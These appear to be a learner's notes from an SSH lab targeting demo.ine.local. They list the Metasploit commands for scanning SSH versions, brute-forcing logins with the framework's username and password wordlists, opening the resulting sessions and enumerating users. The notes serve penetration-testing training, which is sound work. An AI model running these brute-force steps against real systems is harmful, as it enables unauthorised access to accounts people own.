- auxiliary/scanner/ssh/ssh_version
- auxiliary/scanner/ssh/ssh_login

The following username and password dictionary will be useful: - /usr/share/metasploit-framework/data/wordlists/common_users.txt - /usr/share/metasploit-framework/data/wordlists/common_passwords.txt


```
└─# ssh sysadmin@demo.ine.local
```

![Pasted image 20250919221405.png](attachments/Pasted%20image%2020250919221405.png)


```
└─# service postgresql start
└─# msfconsole
msf6 > workspace -a SSH_Enum
msf6 > setg RHOSTS demo.ine.local
msf6 > setg RHOST demo.ine.local
msf6 > search type:auxiliary name:ssh
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > show options 
msf6 auxiliary(scanner/ssh/ssh_version) > run
msf6 auxiliary(scanner/ssh/ssh_version) > search OpenSSH
msf6 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options 
msf6 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
msf6 auxiliary(scanner/ssh/ssh_login) > sessions
msf6 auxiliary(scanner/ssh/ssh_login) > sessions 1


# TO FIND LIST OF USERS ON TARGET SYSTEM
msf6 auxiliary(scanner/ssh/ssh_login) > use auxiliary/scanner/ssh/ssh_enumusers 
set user list
```